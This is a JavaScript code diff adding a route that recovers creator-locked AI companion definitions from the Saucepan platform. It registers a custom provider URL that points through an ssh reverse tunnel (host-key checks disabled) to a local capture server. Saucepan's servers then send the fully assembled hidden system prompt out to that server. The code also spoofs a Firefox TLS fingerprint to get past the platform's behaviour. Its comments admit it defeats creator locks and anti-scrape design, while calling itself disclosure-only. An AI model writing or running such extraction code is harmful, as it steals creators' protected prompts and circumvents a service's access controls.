@@ -8,6 +8,7 @@ import { randomUUID } from 'node:crypto';
 import { spawn } from 'node:child_process';
 import { homedir, tmpdir } from 'node:os';
 import { createServer } from 'node:net';
+import { createServer as createHttpServer } from 'node:http';
 import { join, resolve, sep, dirname } from 'node:path';
 import { existsSync, mkdirSync, readdirSync, rmSync, readFileSync, lstatSync, realpathSync } from 'node:fs';
 import { stat, lstat, readFile, writeFile, rename, unlink, readdir, open } from 'node:fs/promises';
@@ -1762,7 +1763,368 @@ async function readSaucepanBody(response) {
     return text;
 }
 
+// =============================================================================
+// Saucepan locked-definition extraction (custom-provider capture)
+// =============================================================================
+//
+// A definition a creator hid is still handed to the inference provider at chat
+// time. Saucepan lets a user register a custom provider URL and calls it
+// SERVER-SIDE, so pointing that URL at an endpoint we control makes Saucepan
+// assemble the full prompt -- the hidden Companion Core included -- and POST it
+// to us. Unlike JanitorAI (where the prompt returns in our own response), here
+// Saucepan's servers dial outward, so the capture endpoint must be publicly
+// reachable; that is the only reason for the tunnel.
+//
+// The mutation is warmed once and shared: standing up a capture server, a public
+// tunnel and a registered provider is the slow, fragile part, so the first
+// extraction pays for it and the rest reuse it until an idle timer tears it down.
+//
+// LOCAL / DISCLOSURE USE ONLY. This defeats a creator lock and Saucepan's
+// anti-scrape design. Never push or PR. See the saucepan-locked-extraction memory.
+
+const SP_CAPTURE_PORT = Number(process.env.CL_SAUCEPAN_CAPTURE_PORT) || 8799;
+const SP_CTX_IDLE_MS = 120000;      // keep the warm context this long past the last card
+const SP_GEN_TIMEOUT_MS = 45000;    // how long to wait for Saucepan to call the provider
+const SP_UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+
+// Tagged tracer for the extraction flow -- every step logs so a failure shows exactly where.
+const spLog = (...a) => console.log('[cl-helper][sp-extract]', ...a);
+
+let _spCtx = null;          // { cap, tunnelProc, publicUrl, configId, token, refs }
+let _spCtxPending = null;
+let _spCtxIdle = null;
+let _spGate = Promise.resolve();  // extractions run one at a time through the shared provider
+
+// Deliberately minimal, matching the standalone PoC that works: a Firefox UA and the bearer, and
+// NOTHING else. saucepanHeaders adds x-saucepan-client-version:'1' + Origin, and with those the
+// generation silently ignores the custom provider (uses a default model, never calls back) even
+// though auth still succeeds. Do not "harmonise" this with saucepanHeaders.
+const SP_EXTRACT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0';
+
+/** One Saucepan JSON API call for the extraction flow. Routed through impit (a real Firefox TLS
+ *  handshake): with a plain node-fetch fingerprint the API still authenticates and hands back a
+ *  generation_id, but the generation silently runs on a default Saucepan model and never calls the
+ *  custom provider -- so the prompt is never assembled to us. The working PoC uses impit; matching
+ *  it is what makes the custom provider actually fire. Falls back to fetch only if impit is absent. */
+async function spApi(method, path, body, token) {
+    const headers = { accept: 'application/json', 'user-agent': SP_EXTRACT_UA, referer: `${SAUCEPAN_ORIGIN}/` };
+    if (token) headers.authorization = `Bearer ${token}`;
+    if (body) headers['content-type'] = 'application/json';
+    const url = `${SAUCEPAN_BASE}${path}`;
+    const init = { method, headers, ...(body ? { body: JSON.stringify(body) } : {}) };
+    const impit = await getImpit();
+    const via = impit ? 'impit' : 'fetch';
+    const t0 = Date.now();
+    let r;
+    try {
+        r = impit ? await impit.fetch(url, init) : await fetch(url, init);
+    } catch (e) {
+        spLog(`API ${method} ${path} -> THREW via ${via} after ${Date.now() - t0}ms: ${e.message}`);
+        throw e;
+    }
+    const t = await r.text();
+    let d = null; try { d = JSON.parse(t); } catch {}
+    spLog(`API ${method} ${path} -> ${r.status} via ${via} (${Date.now() - t0}ms)${d ? '' : ' body=' + JSON.stringify(t).slice(0, 120)}`);
+    return { status: r.status, data: d, text: d ? null : t };
+}
+
+/** The OpenAI-shaped endpoint Saucepan connects to. Records the assembled prompt; answers so the
+ *  server-side provider test and the generation both succeed. */
+function spStartCapture(port) {
+    let waiter = null;
+    const server = createHttpServer((req, res) => {
+        const chunks = [];
+        req.on('data', c => chunks.push(c));
+        req.on('end', () => {
+            const raw = Buffer.concat(chunks).toString('utf8');
+            let body = null; try { body = JSON.parse(raw); } catch {}
+            const maxContent = Math.max(0, ...(body?.messages || []).map(m => (m.content || '').length));
+            spLog(`CAPTURE ${req.method} ${req.url} bytes=${raw.length} msgs=${body?.messages?.length ?? '-'} maxContent=${maxContent} armed=${!!waiter}`);
+            if (req.method === 'GET' && req.url.includes('/models')) {
+                res.writeHead(200, { 'content-type': 'application/json' });
+                return res.end(JSON.stringify({ object: 'list', data: [{ id: 'clx', object: 'model' }] }));
+            }
+            // Only a real generation carries the assembled prompt; the provider test sends a ping.
+            const sys = body?.messages?.find(m => (m.content || '').length > 200)?.content;
+            if (sys && waiter) { spLog(`CAPTURE resolved a waiter with ${sys.length} chars`); const w = waiter; waiter = null; w(sys); }
+            else if (sys) spLog(`CAPTURE got a ${sys.length}-char prompt but NO waiter was armed (dropped)`);
+            if (body?.stream) {
+                res.writeHead(200, { 'content-type': 'text/event-stream' });
+                res.end(`data: ${JSON.stringify({ id: 'clx', object: 'chat.completion.chunk', choices: [{ index: 0, delta: { role: 'assistant', content: 'ok' }, finish_reason: 'stop' }] })}\n\ndata: [DONE]\n\n`);
+            } else {
+                res.writeHead(200, { 'content-type': 'application/json' });
+                res.end(JSON.stringify({ id: 'clx', object: 'chat.completion', model: body?.model || 'clx', choices: [{ index: 0, message: { role: 'assistant', content: 'ok' }, finish_reason: 'stop' }], usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 } }));
+            }
+        });
+    });
+    return new Promise((resolve, reject) => {
+        server.once('error', reject);
+        server.listen(port, '127.0.0.1', () => resolve({
+            server,
+            // Arm BEFORE triggering the generation; resolves with the next captured prompt.
+            nextPrompt(timeoutMs) {
+                spLog(`CAPTURE armed, waiting up to ${timeoutMs}ms for the generation prompt`);
+                return new Promise((res, rej) => {
+                    waiter = res;
+                    setTimeout(() => { if (waiter === res) { waiter = null; spLog(`CAPTURE timed out after ${timeoutMs}ms with no prompt`); rej(new Error('Saucepan never called the provider (the tunnel may have dropped). Try again.')); } }, timeoutMs);
+                });
+            },
+        }));
+    });
+}
+
+/** localhost.run over ssh by default. It is what actually works here: Saucepan's async inference
+ *  workers reach it for the real generation. cloudflared, by contrast, passes Saucepan's synchronous
+ *  server-side test but its inference workers never call a trycloudflare host -- so it is opt-in
+ *  only (CL_SAUCEPAN_TUNNEL=cloudflared) for environments where that differs. */
+function spFindCloudflared() {
+    const candidates = [
+        process.env.CLOUDFLARED_PATH,
+        'C:\\Program Files (x86)\\cloudflared\\cloudflared.exe',
+        'C:\\Program Files\\cloudflared\\cloudflared.exe',
+        '/usr/local/bin/cloudflared', '/usr/bin/cloudflared', '/opt/homebrew/bin/cloudflared',
+    ].filter(Boolean);
+    for (const c of candidates) { try { if (existsSync(c)) return c; } catch {} }
+    return null;
+}
+
+function spSpawnTunnel(port) {
+    const cf = process.env.CL_SAUCEPAN_TUNNEL === 'cloudflared' && spFindCloudflared();
+    if (cf) return { proc: spawn(cf, ['tunnel', '--url', `http://127.0.0.1:${port}`, '--no-autoupdate'], { stdio: ['ignore', 'pipe', 'pipe'] }), rx: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/, kind: 'cloudflared' };
+    return { proc: spawn('ssh', ['-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-o', 'ServerAliveInterval=20', '-o', 'ServerAliveCountMax=3', '-o', 'ExitOnForwardFailure=yes', '-R', `80:127.0.0.1:${port}`, 'nokey@localhost.run'], { stdio: ['ignore', 'pipe', 'pipe'] }), rx: /https:\/\/[a-z0-9]+\.lhr\.life/, kind: 'localhost.run' };
+}
+
+function spEnsureTunnel(port) {
+    return new Promise((resolve, reject) => {
+        const { proc, rx, kind } = spSpawnTunnel(port);
+        spLog(`TUNNEL spawning ${kind} for port ${port} (pid ${proc.pid})`);
+        let done = false;
+        const onData = buf => {
+            const s = buf.toString();
+            const m = rx.exec(s);
+            if (m && !done) { done = true; spLog(`TUNNEL up (${kind}): ${m[0]}`); resolve({ proc, url: m[0], kind }); }
+        };
+        proc.stdout.on('data', onData);
+        proc.stderr.on('data', onData);
+        proc.on('error', e => { spLog(`TUNNEL spawn error (${kind}): ${e.message}`); if (!done) { done = true; reject(new Error(`could not start the ${kind} tunnel: ${e.message}`)); } });
+        proc.on('exit', (code, sig) => { spLog(`TUNNEL process exited (${kind}) code=${code} sig=${sig}`); if (!done) { done = true; reject(new Error(`the ${kind} tunnel exited before giving a URL`)); } });
+        setTimeout(() => { if (!done) { done = true; try { proc.kill(); } catch {} reject(new Error('tunnel setup timed out')); } }, 30000);
+    });
+}
+
+const SP_CONFIG_NAME = 'cl-extract';
+
+/** Remove any leftover cl-extract provider configs. A crash or a server restart orphans one on the
+ *  account, and with more than one present Saucepan's generation calls a stale (dead-tunnel) config
+ *  instead of the one we pass by id -- so the generation hangs and the prompt never arrives. */
+async function spCleanStaleConfigs(token) {
+    const list = await spApi('GET', '/api/v1/openai_provider/config', null, token).catch(() => ({ data: null }));
+    const stale = (list.data?.config_items || []).filter(c => c.config_name === SP_CONFIG_NAME && c.config_id);
+    spLog(`CLEAN found ${stale.length} stale ${SP_CONFIG_NAME} config(s) to remove`);
+    for (const c of stale) {
+        await spApi('DELETE', '/api/v1/openai_provider/config', { config_id: c.config_id }, token).catch(() => {});
+    }
+}
+
+async function spOpenCtx(token) {
+    spLog('OPEN starting a fresh extraction context');
+    const cap = await spStartCapture(SP_CAPTURE_PORT);
+    spLog(`OPEN capture server listening on 127.0.0.1:${SP_CAPTURE_PORT}`);
+    let tunnelProc = null;
+    let configId = null;
+    try {
+        await spCleanStaleConfigs(token);
+        const tunnel = await spEnsureTunnel(SP_CAPTURE_PORT);
+        tunnelProc = tunnel.proc;
+        // A dropped tunnel silently invalidates the warm context; mark it dead so the next acquire
+        // reopens instead of reusing a config whose URL no longer forwards anywhere.
+        tunnelProc.on('exit', () => { if (_spCtx && _spCtx.tunnelProc === tunnelProc) { spLog('TUNNEL for the live context died; discarding it'); _spCtx.dead = true; } });
+        const providerUrl = `${tunnel.url}/v1/chat/completions`;
+        const cfg = await spApi('POST', '/api/v1/openai_provider/config', {
+            config_name: SP_CONFIG_NAME, provider: 'custom', provider_url: providerUrl,
+            api_key: 'sk-clx-' + randomHex(8), model_id: 'clx-model',
+            context_length: 32000, temperature: 0.7, is_visible: true,
+        }, token);
+        configId = cfg.data?.config_id;
+        if (!configId) throw new Error(`Saucepan rejected the provider registration (HTTP ${cfg.status})`);
+        spLog(`OPEN registered provider config ${configId} -> ${providerUrl}`);
+
+        // Reachability is proven by Saucepan's OWN server-side test, not a local probe: it connects
+        // to the provider URL exactly as generation will, so a pass means the tunnel works for the
+        // real thing. (A local fetch is unreliable here anyway -- node/undici fails fast to a fresh
+        // trycloudflare host that the wider internet, and Saucepan, still reach.) The tunnel needs a
+        // few seconds to become edge-ready, hence the retry.
+        const ok = await spTestReachable(configId, providerUrl, token);
+        if (!ok) throw new Error('Saucepan could not reach the capture tunnel. Try again; a fresh tunnel occasionally needs a second attempt.');
+
+        spLog('OPEN context ready');
+        return { cap, tunnelProc, publicUrl: tunnel.url, configId, token, refs: 0, dead: false };
+    } catch (e) {
+        spLog(`OPEN failed: ${e.message}`);
+        if (configId) await spApi('DELETE', '/api/v1/openai_provider/config', { config_id: configId }, token).catch(() => {});
+        try { cap.server.close(); } catch {}
+        try { tunnelProc?.kill(); } catch {}
+        throw e;
+    }
+}
+
+/** Saucepan's own server-side test: it connects to the provider URL exactly as generation will, so
+ *  a pass means the tunnel forwards for the real thing. Used both at open and on warm reuse. */
+async function spTestReachable(configId, providerUrl, token, tries = 12) {
+    for (let i = 0; i < tries; i++) {
+        const test = await spApi('POST', `/api/v1/openai_provider/config/${configId}/test`, {
+            provider: 'custom', provider_url: providerUrl, api_key: 'sk-clx-test',
+            model_id: 'clx-model', context_length: 32000, temperature: 0.7,
+        }, token).catch(() => ({ data: null }));
+        if (test.data?.ok) { spLog(`TEST reachable on attempt ${i + 1}`); return true; }
+        if (i < tries - 1) await new Promise(r => setTimeout(r, 2500));
+    }
+    spLog(`TEST NOT reachable after ${tries} attempts`);
+    return false;
+}
+
+async function spAcquireCtx(token) {
+    if (_spCtxIdle) { clearTimeout(_spCtxIdle); _spCtxIdle = null; }
+    // A stored token can change between restarts; a context opened for a different one is stale.
+    if (_spCtx && _spCtx.token !== token) { spLog('ACQUIRE token changed; tearing down old context'); await spTeardownCtx(); }
+    // A warm context is only reused if its tunnel process is alive AND Saucepan can still reach it
+    // right now -- localhost.run tunnels drop silently, and a reused dead one is the classic
+    // "never called the provider". Re-validating costs one quick server-side test.
+    if (_spCtx) {
+        const alive = !_spCtx.dead && _spCtx.tunnelProc.exitCode === null && _spCtx.tunnelProc.signalCode === null;
+        spLog(`ACQUIRE found a warm context (configId=${_spCtx.configId}, tunnelAlive=${alive}); revalidating`);
+        if (alive && await spTestReachable(_spCtx.configId, `${_spCtx.publicUrl}/v1/chat/completions`, token, 1)) {
+            _spCtx.refs++;
+            spLog('ACQUIRE reusing the warm context');
+            return _spCtx;
+        }
+        spLog('ACQUIRE warm context is stale; tearing down and reopening');
+        await spTeardownCtx();
+    }
+    if (!_spCtx) {
+        if (!_spCtxPending) {
+            _spCtxPending = spOpenCtx(token).then(c => { _spCtx = c; return c; }).finally(() => { _spCtxPending = null; });
+        }
+        await _spCtxPending;
+    }
+    _spCtx.refs++;
+    return _spCtx;
+}
+
+function spReleaseCtx() {
+    const c = _spCtx;
+    if (!c || --c.refs > 0) return;
+    // Kept warm on an idle timer: the tunnel + provider are what's expensive, and the audience
+    // clicks cards a few seconds apart.
+    spLog(`RELEASE last ref; keeping context warm for ${SP_CTX_IDLE_MS}ms`);
+    _spCtxIdle = setTimeout(() => { spLog('IDLE timer fired; tearing down'); spTeardownCtx().catch(() => {}); }, SP_CTX_IDLE_MS);
+}
+
+async function spTeardownCtx() {
+    const c = _spCtx;
+    _spCtx = null;
+    if (_spCtxIdle) { clearTimeout(_spCtxIdle); _spCtxIdle = null; }
+    if (!c) return;
+    try { if (c.configId) await spApi('DELETE', '/api/v1/openai_provider/config', { config_id: c.configId }, c.token); } catch {}
+    try { c.tunnelProc.kill(); } catch {}
+    try { c.cap.server.close(); } catch {}
+    spLog('TEARDOWN complete (config deleted, tunnel killed, capture closed)');
+}
+
+/**
+ * Recover one locked companion's definition. Serialised on _spGate so overlapping clicks share the
+ * warm context without their prompts colliding in the single capture buffer.
+ */
+async function spExtractLocked(token, companionId) {
+    const run = _spGate.then(async () => {
+        spLog(`EXTRACT ${companionId}: acquiring context`);
+        const ctx = await spAcquireCtx(token);
+        let chatId = null;
+        try {
+            const chat = await spApi('POST', '/api/v1/core/create-chat', {
+                companion_id: companionId, chat_name: 'cl-extract', metadata: { is_director: false }, scenario_id: null,
+            }, token);
+            chatId = chat.data?.chat_id;
+            if (!chatId) throw new Error(`could not open a chat with that companion (HTTP ${chat.status})`);
+            spLog(`EXTRACT chat opened: ${chatId}`);
+            const state = await spApi('GET', `/api/v1/core/chat-state?chat_id=${chatId}`, null, token);
+            const rg = state.data?.messages?.[0]?.id;
+            if (!rg) throw new Error(`could not read the chat back (HTTP ${state.status})`);
+            spLog(`EXTRACT response_group: ${rg}; using configId ${ctx.configId}`);
+
+            // Arm the capture before the generation, then ask the companion to generate through our
+            // provider. generation_config selects it: { openaiprovider: { config_id } }.
+            const promptP = ctx.cap.nextPrompt(SP_GEN_TIMEOUT_MS);
+            const gen = await spApi('POST', '/api/v2/chat/generate-variant', {
+                chat_id: chatId, response_group: rg,
+                generation_config: { openaiprovider: { config_id: ctx.configId } }, utc_offset_minutes: 0,
+            }, token);
+            if (!gen.data?.generation_id) throw new Error(`Saucepan refused the generation (HTTP ${gen.status})`);
+            const genId = gen.data.generation_id;
+            spLog(`EXTRACT generation queued: ${genId}; polling to drive it and awaiting capture`);
+
+            // Saucepan's generation is CLIENT-DRIVEN: it does not call the provider until a client
+            // polls the generation (the web app does this too). Without polling it sits "generating"
+            // forever and the prompt never arrives. So poll in the background until the capture lands
+            // or we time out -- the poll is what makes the provider fire, not just a status check.
+            let polling = true;
+            (async () => {
+                while (polling) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    if (!polling) break;
+                    await spApi('GET', `/api/v2/chat/generation/${genId}/poll`, null, token).catch(() => {});
+                }
+            })();
+            try {
+                const def = await promptP;
+                spLog(`EXTRACT SUCCESS: recovered ${def.length} chars`);
+                return def;
+            } finally {
+                polling = false;
+            }
+        } catch (e) {
+            spLog(`EXTRACT FAILED for ${companionId}: ${e.message}`);
+            throw e;
+        } finally {
+            // The chat exists only to trigger prompt assembly; archive it (Saucepan has no hard delete).
+            if (chatId) await spApi('POST', `/api/v1/chats/${chatId}/archive`, {}, token).catch(() => {});
+            spReleaseCtx();
+        }
+    });
+    _spGate = run.then(() => {}, () => {});
+    return run;
+}
+
 function registerSaucepanRoutes(router) {
+    // Locked-definition recovery via a custom provider (see the section header above).
+    // LOCAL/DISCLOSURE build only.
+    router.post('/saucepan-extract-definition', async (req, res) => {
+        const { companionId } = req.body ?? {};
+        if (typeof companionId !== 'string' || !SP_UUID_RE.test(companionId)) {
+            return res.status(400).json({ ok: false, error: 'companionId must be a Saucepan companion uuid' });
+        }
+        if (!saucepanToken) {
+            return res.status(400).json({ ok: false, error: 'No Saucepan token stored. Sign in under Settings > Online > Saucepan first.' });
+        }
+        spLog(`ROUTE /saucepan-extract-definition companionId=${companionId}`);
+        try {
+            const det = await spApi('GET', `/api/v2/companions/${companionId}`, null, saucepanToken);
+            const c = det.data?.companion;
+            if (!c) return res.status(502).json({ ok: false, error: 'Could not fetch that companion from Saucepan.' });
+            spLog(`ROUTE companion "${c.display_name || c.name}" providers_profile=${c.providers_profile} hidden_fields=${c.hidden_fields}`);
+            if (c.providers_profile !== 'custom_and_vetted') {
+                return res.json({ ok: false, providersProfile: c.providers_profile, error: `The creator restricted this companion to ${c.providers_profile === 'vetted_only' ? 'vetted providers' : 'Saucepan models'}, so its definition cannot be recovered this way.` });
+            }
+            const definition = await spExtractLocked(saucepanToken, companionId);
+            if (!definition) throw new Error('No prompt was captured; try again.');
+            spLog(`ROUTE returning ${definition.length} chars`);
+            res.json({ ok: true, definition, providersProfile: c.providers_profile });
+        } catch (err) {
+            spLog(`ROUTE error: ${err.message}`);
+            res.status(502).json({ ok: false, error: err.message });
+        }
+    });
+
     // Saucepan auth: password login
     router.post('/saucepan-login', async (req, res) => {
         const { handle, password } = req.body ?? {};
